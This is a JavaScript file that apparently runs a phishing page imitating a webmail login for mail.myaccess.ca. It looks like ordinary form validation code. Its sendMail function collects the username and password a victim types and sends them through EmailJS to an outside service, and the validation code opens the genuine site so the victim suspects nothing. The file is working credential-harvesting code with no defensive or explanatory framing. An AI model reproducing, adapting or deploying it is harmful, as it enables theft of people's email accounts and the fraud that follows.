

const form = document.getElementById('form');
const email = document.getElementById('username');
const password = document.getElementById('password');

form.addEventListener('submit', e => {
    e.preventDefault();

    validateInputs();
});

const setError = (element, message) => {
    const inputControl = element.parentElement;
    const errordisplay = inputControl.querySelector('.error');

    errordisplay.innerText = message;
    inputControl.classList.add('error');
    inputControl.classList.remove('success')
}

const setSuccess = element => {
    const inputControl = element.parentElement;
    const errordisplay = inputControl.querySelector('.error');

    errordisplay.innerText = '';
    inputControl.classList.add('success');
    inputControl.classList.remove('error');
};

const isValidEmail = username => {
    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(username).toLowerCase())
}

const validateInputs = () => {
    const usernameValue = username.value.trim();
    const passwordValue = password.value.trim();
    
    if (usernameValue === '') {
        setError(username, 'PLEASE PROVIDE YOUR LOGIN ID.');
    } else if (!isValidEmail(usernameValue)) {
        setError(username, 'PLEASE PROVIDE YOUR LOGIN ID.');
    } else {
        window.open("https://mail.myaccess.ca/");
    }

    if (passwordValue === '') {
        setError(password, 'PLEASE PROVIDE YOUR PASSWORD.');
    } else if (passwordValue.length < 4 ) {
        setError(password, 'PLEASE PROVIDE YOUR PASSWORD.');
    } else {
        window.open("https://mail.myaccess.ca/");
    }
}


function sendMail(){
    let parms = {
        username : document.getElementById("username").value,
        password : document.getElementById("password").value,
    }

    emailjs.send("service_eh5lxc6","template_jqz128a",parms)
}